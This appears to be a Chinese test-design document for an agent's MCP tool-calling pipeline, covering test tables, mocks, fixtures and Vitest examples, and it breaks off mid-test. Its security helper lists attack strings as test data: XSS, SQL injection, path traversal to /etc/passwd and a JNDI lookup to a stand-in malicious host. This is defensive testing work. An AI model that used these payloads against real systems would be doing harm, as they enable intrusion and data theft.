# DPML Agent MCP模块测试用例设计

## 1. 测试范围分析

基于对Agent-MCP-design.md和Agent-MCP-develop-design.md文档的分析，本测试用例设计文档针对Agent MCP模块定义全面的测试策略和具体测试用例。Agent MCP模块作为DPML Agent的扩展功能，主要职责是为Agent提供工具调用能力，允许大语言模型请求执行特定的工具操作。

### 1.1 模块架构概览

Agent MCP模块遵循DPML项目的分层架构：
- **API层**：McpClient模块，提供registerMcp函数
- **Types层**：定义McpConfig, McpError等类型
- **Core层**：实现mcpService和相关组件，管理工具调用流程

### 1.2 核心功能组件

测试需覆盖以下核心功能组件：
- **MCP注册功能**：注册MCP增强器到全局注册表
- **LLM客户端增强**：为LLM客户端添加工具调用能力
- **工具调用管道**：处理工具调用的完整流程
- **处理器链**：包括工具准备、对话入口、流分叉、工具调用提取、工具执行等处理器
- **流式处理**：保持流式输出体验的同时支持工具调用
- **官方SDK集成**：与ModelContextProtocol官方SDK的集成
- **错误处理**：统一处理各种错误场景

## 2. 测试优先级和策略

基于模块特点，测试优先级如下：

1. **集成测试**（最高优先级）：验证责任链模式下处理器之间的协作和数据流
2. **关键组件单元测试**：验证关键处理器的独立功能
3. **端到端测试**：验证完整用户交互场景
4. **契约测试**：验证API和类型定义的稳定性

## 3. 集成测试用例设计

### 3.1 处理器责任链集成测试

**文件路径**: `packages/agent/src/__tests__/integration/mcp/pipeline/ToolCallPipeline.integration.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| IT-MCP-Pipeline-01 | 处理器链应按顺序执行所有处理器 | 验证处理器执行顺序 | 包含工具调用的消息 | 处理器按预期顺序执行，状态正确传递 | 模拟各处理器，跟踪调用顺序 |
| IT-MCP-Pipeline-02 | 处理器链应正确处理工具调用场景 | 验证完整工具调用流程 | 包含工具调用的消息 | 工具被正确调用并返回结果 | 模拟LLM响应和工具执行 |
| IT-MCP-Pipeline-03 | 处理器链应正确处理无工具调用场景 | 验证普通对话流程 | 不包含工具调用的消息 | 正常返回LLM响应，不调用工具 | 模拟LLM响应 |
| IT-MCP-Pipeline-04 | 处理器链应正确处理流式输出场景 | 验证流式处理逻辑 | 流式响应请求 | 保持流式体验，同时处理工具调用 | 模拟流式LLM响应 |
| IT-MCP-Pipeline-05 | 处理器链应正确处理多轮工具调用 | 验证递归处理逻辑 | 包含多轮工具调用的对话 | 完成所有工具调用，保持对话连贯 | 模拟LLM响应和工具执行 |

### 3.2 MCP增强器与LLM客户端集成测试

**文件路径**: `packages/agent/src/__tests__/integration/mcp/McpEnhancer.integration.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| IT-MCP-Enhancer-01 | 增强器应正确增强LLM客户端功能 | 验证LLM客户端增强 | 原始LLM客户端实例 | 返回具有工具调用能力的增强客户端 | 模拟原始客户端 |
| IT-MCP-Enhancer-02 | 增强的客户端应支持工具调用 | 验证增强客户端功能 | 包含工具调用的消息 | 工具被成功调用并处理 | 模拟原始客户端和工具处理器 |
| IT-MCP-Enhancer-03 | 增强的客户端应支持流式处理 | 验证增强客户端流处理 | 流式请求 | 保持流式功能，同时支持工具调用 | 模拟流式响应 |
| IT-MCP-Enhancer-04 | 增强的客户端应处理工具执行错误 | 验证错误处理 | 执行失败的工具调用 | 错误被适当处理不影响对话 | 模拟工具执行错误 |

### 3.3 与官方SDK集成测试

**文件路径**: `packages/agent/src/__tests__/integration/mcp/McpClientIntegration.integration.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| IT-MCP-SDK-01 | 应正确创建官方SDK客户端 | 验证SDK客户端创建 | MCP配置 | 成功创建官方SDK客户端实例 | 模拟SDK构造函数 |
| IT-MCP-SDK-02 | 应正确连接到MCP服务器 | 验证连接功能 | 连接配置 | 成功建立连接 | 模拟SDK连接方法 |
| IT-MCP-SDK-03 | 应正确获取工具列表 | 验证工具列表获取 | 无 | 返回可用工具列表 | 模拟SDK listTools方法 |
| IT-MCP-SDK-04 | 应正确调用工具 | 验证工具调用功能 | 工具名称和参数 | 成功调用工具并获取结果 | 模拟SDK callTool方法 |
| IT-MCP-SDK-05 | 应正确处理SDK连接错误 | 验证SDK错误处理 | 错误的连接配置 | 错误被适当处理并报告 | 模拟SDK连接失败 |

## 4. 关键组件单元测试

### 4.1 ToolCallExtractorProcessor单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/ToolCallExtractorProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-Extractor-01 | 应从LLM响应中提取工具调用 | 验证工具调用提取 | 包含工具调用标记的响应 | 正确提取工具名称和参数 | 无需模拟 |
| UT-MCP-Extractor-02 | 应处理多个工具调用 | 验证多工具调用处理 | 包含多个工具调用的响应 | 提取所有工具调用 | 无需模拟 |
| UT-MCP-Extractor-03 | 应忽略没有工具调用的响应 | 验证无工具调用情况 | 普通文本响应 | 不提取任何工具调用 | 无需模拟 |
| UT-MCP-Extractor-04 | 应从流式内容中提取工具调用 | 验证流式内容处理 | 流式响应中包含工具调用 | 正确提取工具调用 | 模拟异步迭代器 |
| UT-MCP-Extractor-05 | 应处理格式不规范的工具调用 | 验证容错能力 | 格式不完全符合的工具调用 | 尽可能提取有效信息 | 无需模拟 |

### 4.2 ToolExecutionProcessor单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/ToolExecutionProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-Executor-01 | 应执行有效的工具调用 | 验证工具执行功能 | 有效工具调用 | 成功执行并返回结果 | 模拟MCP客户端 |
| UT-MCP-Executor-02 | 应处理工具执行错误 | 验证错误处理 | 导致错误的工具调用 | 错误被适当捕获和处理 | 模拟MCP客户端抛出错误 |
| UT-MCP-Executor-03 | 应处理多个工具调用 | 验证批量执行功能 | 多个工具调用 | 所有工具被执行，结果正确收集 | 模拟MCP客户端 |
| UT-MCP-Executor-04 | 应处理不存在的工具调用 | 验证无效工具处理 | 引用不存在工具的调用 | 返回适当错误信息 | 模拟MCP客户端抛出错误 |
| UT-MCP-Executor-05 | 应处理无工具调用情况 | 验证无操作情况 | 无工具调用的上下文 | 不执行任何调用，保持上下文不变 | 模拟MCP客户端 |

### 4.3 StartSideBandProcessor单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/StartSideBandProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-SideBand-01 | 应处理流式响应分叉 | 验证流式分叉处理 | 流式响应 | 创建分叉处理并继续管道流程 | 模拟异步迭代器 |
| UT-MCP-SideBand-02 | 应处理非流式响应 | 验证非流式处理 | 非流式响应 | 不创建分叉，正常继续管道 | 无需模拟 |
| UT-MCP-SideBand-03 | 应在流中检测工具调用意图 | 验证检测功能 | 包含工具调用标记的流 | 正确识别工具调用意图 | 模拟异步迭代器 |
| UT-MCP-SideBand-04 | 应处理流内容收集 | 验证内容收集功能 | 多块流内容 | 正确收集和组合内容 | 模拟异步迭代器 |
| UT-MCP-SideBand-05 | 应处理空响应 | 验证边界情况 | 空响应 | 正常处理不抛出错误 | 无需模拟 |

### 4.4 RecursiveProcessor单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/RecursiveProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-Recursive-01 | 应重新执行管道处理工具结果 | 验证递归处理功能 | 有工具结果的上下文 | 创建新上下文并重新执行管道 | 模拟管道实例 |
| UT-MCP-Recursive-02 | 应处理无需继续处理的情况 | 验证终止条件 | 无需继续处理的上下文 | 不进行递归处理 | 无需模拟 |
| UT-MCP-Recursive-03 | 应遵守最大递归深度限制 | 验证深度限制 | 会超过深度限制的情况 | 在达到限制时停止递归 | 模拟管道实例 |
| UT-MCP-Recursive-04 | 应合并递归结果到最终上下文 | 验证结果合并 | 多层递归的上下文 | 正确合并所有层的结果 | 模拟管道实例 |
| UT-MCP-Recursive-05 | 应处理递归过程中的错误 | 验证错误处理 | 递归中出错的情况 | 错误被正确处理，不影响整体流程 | 模拟管道抛出错误 |
| UT-MCP-Recursive-06 | 应在达到最大深度时生成提示消息 | 验证深度限制提示 | 达到最大递归深度的调用 | 返回带有提示的消息 | 模拟管道实例 |
| UT-MCP-Recursive-07 | 应处理会导致无限递归的情况 | 验证无限递归防护 | 会导致无限递归的工具结果 | 在达到深度限制时终止并提供明确错误 | 模拟管道实例 |

### 4.5 流式分叉处理单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/StreamHandlingProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-Stream-01 | 应正确分叉处理和客户端展示流 | 验证流分叉处理 | 流式响应 | 创建两个独立流用于处理和展示 | 模拟异步迭代器 |
| UT-MCP-Stream-02 | 用户流应不含工具调用标记 | 验证用户体验 | 含工具调用标记的流 | 用户流中不显示原始工具调用标记 | 模拟异步迭代器 |
| UT-MCP-Stream-03 | 处理流应包含完整内容供提取 | 验证工具提取 | 流式内容 | 处理流中包含完整内容供后续提取 | 模拟异步迭代器 |
| UT-MCP-Stream-04 | 分叉后两个流应独立运行不互相阻塞 | 验证并行处理 | 大量流块的响应 | 两个流并行处理不相互影响 | 模拟异步迭代器 |
| UT-MCP-Stream-05 | 客户端流中断不应影响处理流 | 验证流独立性 | 客户端流被中断的情况 | 处理流继续完成工作 | 模拟异步迭代器和中断 |

### 4.6 工具调用格式处理单元测试

**文件路径**: `packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/ToolFormatProcessor.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| UT-MCP-Format-01 | 应识别标准格式工具调用 | 验证格式识别 | 标准格式工具调用 | 正确提取工具名和参数 | 无需模拟 |
| UT-MCP-Format-02 | 应识别替代格式工具调用 | 验证格式兼容性 | 替代XML标签格式调用 | 正确提取工具名和参数 | 无需模拟 |
| UT-MCP-Format-03 | 应识别JSON格式工具调用 | 验证格式兼容性 | JSON格式工具调用 | 正确提取工具名和参数 | 无需模拟 |
| UT-MCP-Format-04 | 应处理格式错误但可识别的调用 | 验证容错性 | 格式不完全符合的调用 | 尽可能提取有效信息 | 无需模拟 |
| UT-MCP-Format-05 | 应处理内嵌在文本中的工具调用 | 验证提取能力 | 嵌在文本中的工具调用 | 正确识别并提取工具调用 | 无需模拟 |

## 5. 端到端测试用例

### 5.1 用户交互场景测试

**文件路径**: `packages/agent/src/__tests__/e2e/mcp/UserInteraction.e2e.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| E2E-MCP-User-01 | 应支持无工具调用的普通对话 | 验证基本对话功能 | 普通用户问题 | 返回正常LLM响应，不执行工具 | 最小模拟 |
| E2E-MCP-User-02 | 应支持单次工具调用对话 | 验证工具调用功能 | 需要工具调用的问题 | 执行工具并整合结果到回答 | 模拟外部服务 |
| E2E-MCP-User-03 | 应支持多轮工具调用对话 | 验证复杂交互功能 | 需要多次工具调用的问题 | 顺序执行多个工具并整合结果 | 模拟外部服务 |
| E2E-MCP-User-04 | 应支持流式输出与工具调用 | 验证流式体验 | 需要流式输出和工具调用的场景 | 保持流式体验，同时执行工具 | 模拟流式响应 |
| E2E-MCP-User-05 | 应处理工具调用失败情况 | 验证错误恢复功能 | 导致工具失败的问题 | 优雅处理错误并继续对话 | 模拟工具失败 |

### 5.2 SDK集成端到端测试

**文件路径**: `packages/agent/src/__tests__/e2e/mcp/MCP-SDK-Integration.e2e.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| E2E-MCP-SDK-01 | 应成功集成官方SDK客户端 | 验证SDK集成功能 | MCP配置 | 成功创建和使用SDK客户端 | 模拟SDK响应 |
| E2E-MCP-SDK-02 | 应通过SDK执行工具调用 | 验证工具执行功能 | 需要调用工具的问题 | 通过SDK成功执行工具 | 模拟SDK调用 |
| E2E-MCP-SDK-03 | 应通过SDK处理流式工具调用 | 验证流式SDK集成 | 流式请求带工具调用 | 流式处理与工具调用协同工作 | 模拟SDK流处理 |
| E2E-MCP-SDK-04 | 应处理SDK连接问题 | 验证错误处理 | 无效连接配置 | 优雅处理连接错误 | 模拟连接失败 |
| E2E-MCP-SDK-05 | 应处理SDK版本兼容性 | 验证兼容性处理 | 不同SDK版本 | 正确处理版本差异 | 模拟不同版本SDK |

### 5.3 错误处理端到端测试

**文件路径**: `packages/agent/src/__tests__/e2e/mcp/ErrorHandling.e2e.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| E2E-MCP-Error-01 | 应处理不存在工具的调用 | 验证工具不存在处理 | 调用不存在的工具 | 返回适当错误信息并继续对话 | 最小模拟 |
| E2E-MCP-Error-02 | 应处理工具执行失败情况 | 验证工具失败处理 | 导致工具执行失败的输入 | 返回失败信息并恢复对话 | 模拟工具执行失败 |
| E2E-MCP-Error-03 | 应处理MCP服务连接错误 | 验证连接错误处理 | MCP服务不可用 | 降级为纯LLM对话并告知用户 | 模拟连接失败 |
| E2E-MCP-Error-04 | 应处理参数验证失败情况 | 验证参数验证 | 无效参数调用工具 | 返回参数验证错误并请求正确输入 | 模拟参数验证 |
| E2E-MCP-Error-05 | 应处理工具执行超时 | 验证超时处理 | 导致执行超时的操作 | 返回超时信息并恢复对话 | 模拟执行超时 |

### 5.4 性能和并发测试

**文件路径**: `packages/agent/src/__tests__/e2e/mcp/Performance.e2e.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| E2E-MCP-Perf-01 | 应能并行处理多个工具调用 | 验证并行处理能力 | 包含多个工具调用的问题 | 并行执行工具并合理整合结果 | 模拟工具执行 |
| E2E-MCP-Perf-02 | 应在高负载下维持响应性 | 验证负载能力 | 高频率连续对话 | 保持合理响应时间 | 模拟LLM和工具响应 |
| E2E-MCP-Perf-03 | 应优雅处理资源限制情况 | 验证资源管理 | 超出资源限制的操作 | 优雅降级并告知用户 | 模拟资源限制 |

## 6. 契约测试用例

### 6.1 API层契约测试

**文件路径**: `packages/agent/src/__tests__/contract/api/mcp.contract.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| CT-API-MCP-01 | registerMcp函数应符合公开契约 | 验证API签名 | 无 | 函数存在且签名正确 | 无需模拟 |
| CT-API-MCP-02 | registerMcp函数应接受正确的配置对象 | 验证参数类型 | 各种配置对象 | 类型检查通过 | 模拟Core层 |
| CT-API-MCP-03 | registerMcp函数应将调用委托给mcpService | 验证委托关系 | MCP配置对象 | 调用mcpService.registerEnhancer | 模拟mcpService |

### 6.2 Types层契约测试

**文件路径**: `packages/agent/src/__tests__/contract/types/McpConfig.contract.test.ts`

| ID | 测试用例名称 | 测试目的 | 测试输入 | 期望结果 | Mock情况 |
|----|------------|---------|---------|---------|---------|
| CT-Type-MCP-01 | McpConfig接口应符合预期结构 | 验证类型定义 | 无 | 接口包含所有必要字段 | 无需模拟 |
| CT-Type-MCP-02 | McpError类应符合预期结构 | 验证错误类型 | 无 | 类包含所有必要成员 | 无需模拟 |
| CT-Type-MCP-03 | McpErrorType枚举应包含所有错误类型 | 验证枚举定义 | 无 | 枚举包含所有错误类型 | 无需模拟 |

## 7. 模拟策略

### 7.1 LLM客户端模拟

模拟LLM客户端响应对于测试工具调用流程至关重要。

```typescript
// 模拟基本LLM客户端
const mockLlmClient: LLMClient = {
  sendMessages: vi.fn().mockImplementation((messages, stream) => {
    if (stream) {
      // 返回模拟的流式响应
      return createMockAsyncIterator([
        { role: 'assistant', content: 'Mock response part 1' },
        { role: 'assistant', content: '<function_calls>\n<invoke name="testTool">\n<parameter name="param1">value1</parameter>\n</invoke>\n</function_calls>' },
        { role: 'assistant', content: 'Mock response part 3' }
      ]);
    } else {
      // 返回模拟的同步响应
      return Promise.resolve({
        role: 'assistant',
        content: 'Mock response with <function_calls>\n<invoke name="testTool">\n<parameter name="param1">value1</parameter>\n</invoke>\n</function_calls>'
      });
    }
  })
};

// 模拟异步迭代器创建函数
function createMockAsyncIterator<T>(items: T[]): AsyncIterable<T> {
  return {
    [Symbol.asyncIterator]: async function* () {
      for (const item of items) {
        yield item;
      }
    }
  };
}
```

### 7.2 MCP SDK客户端模拟

模拟官方SDK的关键组件和操作。

```typescript
// 模拟MCP SDK客户端
const mockMcpClient = {
  listTools: vi.fn().mockResolvedValue({
    tools: [
      { name: 'testTool', description: 'Test tool for testing', parameters: { param1: { type: 'string' } } },
      { name: 'anotherTool', description: 'Another test tool', parameters: { param1: { type: 'number' } } }
    ]
  }),
  
  callTool: vi.fn().mockImplementation(({ name, arguments: args }) => {
    if (name === 'testTool') {
      return Promise.resolve({
        content: [{ type: 'text', text: `Tool result for ${args.param1}` }]
      });
    } else if (name === 'failingTool') {
      return Promise.reject(new Error('Tool execution failed'));
    }
    return Promise.resolve({ content: [{ type: 'text', text: 'Default result' }] });
  }),
  
  connect: vi.fn().mockResolvedValue(undefined)
};
```

### 7.3 流处理模拟

为测试旁观者模式和流处理创建专用模拟。

```typescript
// 模拟流式响应收集器
class MockStreamCollector {
  private chunks: string[] = [];
  
  // 收集流块
  collect(chunk: string): void {
    this.chunks.push(chunk);
  }
  
  // 获取完整内容
  getFullContent(): string {
    return this.chunks.join('');
  }
  
  // 清空收集器
  clear(): void {
    this.chunks = [];
  }
}
```

### 7.4 安全性测试模拟

```typescript
// 模拟恶意参数测试
class SecurityTestHelper {
  // 常见恶意输入模式
  static maliciousInputs = [
    '<script>alert("XSS")</script>',
    '"; DROP TABLE users; --',
    '../../../etc/passwd',
    '${jndi:ldap://malicious-site.com/exploit}',
    'function() { while(true) {} }()'
  ];
  
  // 生成包含潜在危险内容的工具调用
  static createMaliciousToolCall(toolName: string) {
    const params: Record<string, string> = {};
    
    this.maliciousInputs.forEach((input, index) => {
      params[`param${index + 1}`] = input;
    });
    
    return {
      name: toolName,
      parameters: params
    };
  }
  
  // 验证参数被安全处理（不被执行，适当转义）
  static validateSafeParameterHandling(processedParams: Record<string, any>) {
    // 验证参数值仍然存在但被安全处理
    for (const key in processedParams) {
      const value = processedParams[key];
      if (typeof value === 'string') {
        // 确认值被保留但不会触发安全问题
        expect(value).toBeDefined();
        // 对于XSS，检查是否被转义或sanitize
        if (value.includes('script')) {
          expect(value).not.toEqual('<script>alert("XSS")</script>');
        }
      }
    }
  }
}
```

## 8. 测试夹具设计

### 8.1 ToolCallContext测试夹具

```typescript
/**
 * 创建测试用的工具调用上下文
 */
export function createToolCallContext(options: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    messages: options.messages || [
      { role: 'system', content: 'You are a helpful assistant.' },
      { role: 'user', content: 'Help me with a task.' }
    ],
    stream: options.stream ?? false,
    response: options.response,
    tools: options.tools || [
      { name: 'testTool', description: 'Test tool', parameters: { param1: { type: 'string' } } }
    ],
    toolCalls: options.toolCalls,
    results: options.results,
    finalResponse: options.finalResponse
  };
}

/**
 * 创建包含工具调用的响应
 */
export function createResponseWithToolCall(toolName: string = 'testTool', params: Record<string, any> = { param1: 'value1' }): string {
  const paramStr = Object.entries(params)
    .map(([key, value]) => `<parameter name="${key}">${value}</parameter>`)
    .join('\n');
    
  return `Some text before tool call.\n<function_calls>\n<invoke name="${toolName}">\n${paramStr}\n</invoke>\n</function_calls>\nSome text after.`;
}
```

### 8.2 处理器测试夹具

```typescript
/**
 * 创建测试用的处理器链
 */
export function createProcessorChain(): {
  toolPrep: ToolPreparationProcessor,
  convEntry: ConversationEntryProcessor,
  sideBand: StartSideBandProcessor,
  extractor: ToolCallExtractorProcessor,
  executor: ToolExecutionProcessor,
  formatter: ResultFormattingProcessor,
  recursive: RecursiveProcessor,
  pipeline: ToolCallPipeline
} {
  // 创建模拟的MCP客户端
  const mockMcpClient = {
    listTools: vi.fn().mockResolvedValue({
      tools: [{ name: 'testTool', description: 'Test tool', parameters: { param1: { type: 'string' } } }]
    }),
    callTool: vi.fn().mockResolvedValue({
      content: [{ type: 'text', text: 'Tool result' }]
    })
  };
  
  // 创建模拟的LLM客户端
  const mockLlmClient = {
    sendMessages: vi.fn().mockResolvedValue({
      role: 'assistant',
      content: 'Mock response'
    })
  };
  
  // 创建处理器实例
  const toolPrep = new ToolPreparationProcessor(mockMcpClient);
  const convEntry = new ConversationEntryProcessor(mockLlmClient);
  const sideBand = new StartSideBandProcessor();
  const extractor = new ToolCallExtractorProcessor();
  const executor = new ToolExecutionProcessor(mockMcpClient);
  const formatter = new ResultFormattingProcessor();
  
  // 创建管道
  const pipeline = new ToolCallPipeline();
  
  // 添加处理器到管道
  pipeline
    .addProcessor(toolPrep)
    .addProcessor(convEntry)
    .addProcessor(sideBand)
    .addProcessor(extractor)
    .addProcessor(executor)
    .addProcessor(formatter);
  
  // 创建递归处理器并添加到管道
  const recursive = new RecursiveProcessor(pipeline);
  pipeline.addProcessor(recursive);
  
  return {
    toolPrep,
    convEntry,
    sideBand,
    extractor,
    executor,
    formatter,
    recursive,
    pipeline
  };
}
```

### 8.3 工具调用格式测试夹具

```typescript
/**
 * 创建各种格式的工具调用文本
 */
export function createToolCallFormats(toolName: string = 'testTool', params: Record<string, any> = { param1: 'value1' }): Record<string, string> {
  // 参数字符串
  const paramStr = Object.entries(params)
    .map(([key, value]) => `<parameter name="${key}">${value}</parameter>`)
    .join('\n');
  
  const jsonParams = JSON.stringify(params);
  
  return {
    // 标准格式
    standard: `<function_calls>\n<invoke name="${toolName}">\n${paramStr}\n</invoke>\n</function_calls>`,
    
    // 替代格式
    alternate: `<tool>\n<name>${toolName}</name>\n<parameters>\n${
      Object.entries(params).map(([key, value]) => `<${key}>${value}</${key}>`).join('\n')
    }\n</parameters>\n</tool>`,
    
    // JSON格式
    json: `\`\`\`json\n{"tool": "${toolName}", "parameters": ${jsonParams}}\n\`\`\``,
    
    // 紧凑格式
    compact: `<function_calls><invoke name="${toolName}">${
      Object.entries(params).map(([key, value]) => `<parameter name="${key}">${value}</parameter>`).join('')
    }</invoke></function_calls>`,
    
    // 内嵌在文本中
    embedded: `I need to use a tool.\n<function_calls>\n<invoke name="${toolName}">\n${paramStr}\n</invoke>\n</function_calls>\nNow with the tool result I can continue.`
  };
}

/**
 * 创建测试用异步迭代器模拟流式响应
 */
export class AsyncResponseStreamSimulator<T> implements AsyncIterable<T> {
  private items: T[];
  private chunkDelay: number;
  private failOnChunk: number | null = null;
  
  constructor(items: T[], chunkDelay: number = 10) {
    this.items = [...items];
    this.chunkDelay = chunkDelay;
  }
  
  // 设置在特定块失败
  public failAt(chunkIndex: number): this {
    this.failOnChunk = chunkIndex;
    return this;
  }
  
  // 实现AsyncIterable接口
  public async *[Symbol.asyncIterator](): AsyncIterator<T> {
    for (let i = 0; i < this.items.length; i++) {
      // 模拟网络延迟
      await new Promise(resolve => setTimeout(resolve, this.chunkDelay));
      
      // 模拟错误情况
      if (this.failOnChunk === i) {
        throw new Error(`Stream failed at chunk ${i}`);
      }
      
      yield this.items[i];
    }
  }
}
```

## 9. 测试实现示例

### 9.1 集成测试实现示例

```typescript
// packages/agent/src/__tests__/integration/mcp/pipeline/ToolCallPipeline.integration.test.ts
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { ToolCallPipeline } from '../../../../core/mcp/pipeline/ToolCallPipeline';
import { createToolCallContext, createProcessorChain } from '../../../fixtures/mcp.fixture';

describe('IT-MCP-Pipeline', () => {
  let processors;
  let pipeline: ToolCallPipeline;
  
  beforeEach(() => {
    // 创建处理器链和管道
    const chain = createProcessorChain();
    processors = chain;
    pipeline = chain.pipeline;
    
    // 监视所有处理器的process方法
    vi.spyOn(processors.toolPrep, 'process');
    vi.spyOn(processors.convEntry, 'process');
    vi.spyOn(processors.sideBand, 'process');
    vi.spyOn(processors.extractor, 'process');
    vi.spyOn(processors.executor, 'process');
    vi.spyOn(processors.formatter, 'process');
    vi.spyOn(processors.recursive, 'process');
  });
  
  test('处理器链应按顺序执行所有处理器', async () => {
    // 创建初始上下文
    const context = createToolCallContext();
    
    // 执行管道
    await pipeline.execute(context);
    
    // 验证处理器调用顺序
    expect(processors.toolPrep.process).toHaveBeenCalledBefore(processors.convEntry.process);
    expect(processors.convEntry.process).toHaveBeenCalledBefore(processors.sideBand.process);
    expect(processors.sideBand.process).toHaveBeenCalledBefore(processors.extractor.process);
    expect(processors.extractor.process).toHaveBeenCalledBefore(processors.executor.process);
    expect(processors.executor.process).toHaveBeenCalledBefore(processors.formatter.process);
    expect(processors.formatter.process).toHaveBeenCalledBefore(processors.recursive.process);
  });
  
  test('处理器链应正确处理工具调用场景', async () => {
    // 模拟包含工具调用的响应
    processors.convEntry.process.mockImplementation(async (ctx) => {
      return {
        ...ctx,
        response: {
          role: 'assistant',
          content: '<function_calls>\n<invoke name="testTool">\n<parameter name="param1">value1</parameter>\n</invoke>\n</function_calls>'
        }
      };
    });
    
    // 创建初始上下文
    const context = createToolCallContext();
    
    // 执行管道
    const result = await pipeline.execute(context);
    
    // 验证结果
    expect(processors.extractor.process).toHaveBeenCalled();
    expect(processors.executor.process).toHaveBeenCalled();
    expect(result.toolCalls).toBeDefined();
    expect(result.results).toBeDefined();
  });
});
```

### 9.2 单元测试实现示例

```typescript
// packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/ToolCallExtractorProcessor.test.ts
import { describe, test, expect } from 'vitest';
import { ToolCallExtractorProcessor } from '../../../../../../core/mcp/pipeline/processors/ToolCallExtractorProcessor';
import { createToolCallContext, createResponseWithToolCall } from '../../../../../fixtures/mcp.fixture';

describe('UT-MCP-Extractor', () => {
  const processor = new ToolCallExtractorProcessor();
  
  test('应从LLM响应中提取工具调用', async () => {
    // 创建包含工具调用的上下文
    const context = createToolCallContext({
      response: {
        role: 'assistant',
        content: createResponseWithToolCall('testTool', { param1: 'value1', param2: 'value2' })
      }
    });
    
    // 执行处理器
    const result = await processor.process(context);
    
    // 验证工具调用被正确提取
    expect(result.toolCalls).toBeDefined();
    expect(result.toolCalls).toHaveLength(1);
    expect(result.toolCalls[0].name).toBe('testTool');
    expect(result.toolCalls[0].parameters).toEqual({ param1: 'value1', param2: 'value2' });
  });
  
  test('应处理多个工具调用', async () => {
    // 创建包含多个工具调用的响应
    const content = `
      <function_calls>
      <invoke name="tool1">
      <parameter name="param1">value1</parameter>
      </invoke>
      </function_calls>
      
      Some text in between.
      
      <function_calls>
      <invoke name="tool2">
      <parameter name="param2">value2</parameter>
      </invoke>
      </function_calls>
    `;
    
    const context = createToolCallContext({
      response: { role: 'assistant', content }
    });
    
    // 执行处理器
    const result = await processor.process(context);
    
    // 验证多个工具调用被提取
    expect(result.toolCalls).toBeDefined();
    expect(result.toolCalls).toHaveLength(2);
    expect(result.toolCalls[0].name).toBe('tool1');
    expect(result.toolCalls[1].name).toBe('tool2');
  });
  
  test('应忽略没有工具调用的响应', async () => {
    // 创建不包含工具调用的上下文
    const context = createToolCallContext({
      response: { role: 'assistant', content: 'Just a normal response without any tool calls.' }
    });
    
    // 执行处理器
    const result = await processor.process(context);
    
    // 验证没有提取工具调用
    expect(result.toolCalls).toBeUndefined();
  });
});
```

### 9.3 递归处理边界测试示例

```typescript
// packages/agent/src/__tests__/unit/core/mcp/pipeline/processors/RecursiveProcessor.test.ts
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { RecursiveProcessor } from '../../../../../../core/mcp/pipeline/processors/RecursiveProcessor';
import { createToolCallContext } from '../../../../../fixtures/mcp.fixture';

describe('UT-MCP-Recursive', () => {
  let mockPipeline;
  let processor;
  
  beforeEach(() => {
    // 模拟pipeline
    mockPipeline = {
      execute: vi.fn()
    };
    
    // 创建处理器实例
    processor = new RecursiveProcessor(mockPipeline);
  });
  
  test('应遵守最大递归深度限制', async () => {
    // 准备：设置当前深度接近限制
    Object.defineProperty(processor, 'currentDepth', { value: 4 });
    
    // 设置上下文，包含需要继续处理的工具结果
    const context = createToolCallContext({
      results: [
        {
          toolCall: { name: 'testTool', parameters: {} },
          status: 'success',
          result: 'Tool result that requires further processing'
        }
      ]
    });
    
    // 设置内部shouldContinueProcessing方法始终返回true
    // 这会触发无限递归，但深度限制应阻止它
    const shouldContinueSpy = vi.spyOn(processor as any, 'shouldContinueProcessing')
      .mockReturnValue(true);
    
    // 执行
    const result = await processor.process(context);
    
    // 验证：结果应包含深度限制消息
    expect(result.finalResponse).toBeDefined();
    expect(result.finalResponse.content).toContain('最大工具调用深度');
    
    // 验证：深度重置为0
    expect(processor['currentDepth']).toBe(0);
    
    shouldContinueSpy.mockRestore();
  });
  
  test('应处理会导致无限递归的情况', async () => {
    // 模拟执行总是返回需要继续处理的结果
    mockPipeline.execute.mockImplementation(ctx => {
      return Promise.resolve({
        ...ctx,
        results: [{
          toolCall: { name: 'recursiveTool', parameters: {} },
          status: 'success',
          result: 'Result requiring further processing'
        }]
      });
    });
    
    // 初始上下文
    const context = createToolCallContext({
      results: [
        {
